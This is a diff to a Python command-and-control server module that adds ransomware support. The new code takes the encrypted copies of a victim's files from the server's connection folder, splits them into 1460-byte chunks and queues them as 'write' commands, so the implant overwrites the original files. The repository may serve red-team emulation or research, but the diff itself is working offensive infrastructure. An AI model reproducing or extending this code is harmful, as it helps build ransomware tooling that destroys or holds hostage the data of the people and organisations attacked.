@@ -3,6 +3,7 @@ from string import Formatter
 from typing import List, Union
 from c2.c2_server import ConnectionStorage, send_c2_command
 from c2.c2_facts import FactsStorage, NotExistentFact
+import os
 
 
 class ActionRequirementsNotSatisfied(Exception):
@@ -46,13 +47,33 @@ class C2Action:
                     newCommandList = []
                     curlyFactName = '{' + fact_name + '}'
                     for cmd in self.commandsList:
-                        if curlyFactName not in cmd:
+                        if not isinstance(cmd, str):
+                            newCommandList.append(cmd)
+                        elif curlyFactName not in cmd:
                             newCommandList.append(cmd)
                         else:
                             for fact_item in factsSubset[fact_name]:
                                 fmtSubset = {fact_name: fact_item}
                                 new_cmd = fmt.format(cmd, **fmtSubset)
                                 newCommandList.append(new_cmd)
+                                # "decoration" for write file protocol; should be implemented in an inherited class
+                                try:
+                                    # it is the case in which a list of files is read and then needs to be overwritten
+                                    # with its encrypted version; or rather, it's the case of the ransomware
+                                    if new_cmd.startswith('write') and '_files' in fact_name:
+                                        relative_path = new_cmd.split()[1].replace('\\', '_') + '.enc'
+                                        with open(
+                                            os.path.join('/usr/src/app/c2/connections/', connUuid, relative_path),
+                                            'rb'
+                                        ) as enc_file:
+                                            enc_data = enc_file.read()
+                                        chunk_size = 1460
+                                        enc_data = [enc_data[i:i + chunk_size]
+                                                    for i in range(0, len(enc_data), chunk_size)]
+                                        for chunk in enc_data:
+                                            newCommandList.append(chunk)
+                                except TypeError:
+                                    pass
                     self.commandsList = newCommandList
         fmt = CmdFormatter()
         cmd_uuid_list = []
